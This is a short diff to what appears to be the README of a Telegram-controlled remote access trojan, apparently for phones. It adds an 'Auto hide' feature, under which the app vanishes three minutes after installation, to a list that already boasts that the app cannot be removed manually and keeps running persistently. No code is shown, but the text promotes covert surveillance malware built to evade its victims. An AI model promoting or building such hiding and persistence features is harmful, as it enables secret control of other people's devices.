@@ -26,7 +26,8 @@
 ✔️ **No Port Forwarding Needed** – Operates entirely via Telegram.  
 ✔️ **Telegram-Based RAT** – Control everything through a Telegram bot.  
 ✔️ **Undeletable** – App cannot be removed manually.  
-✔️ **Persistence** – Ensures continuous operation without interruption.  
+✔️ **Persistence** – Ensures continuous operation without interruption.
+✔️ **Auto hide** – The app will automatically disappear three minutes after installation..
 
 ---
 
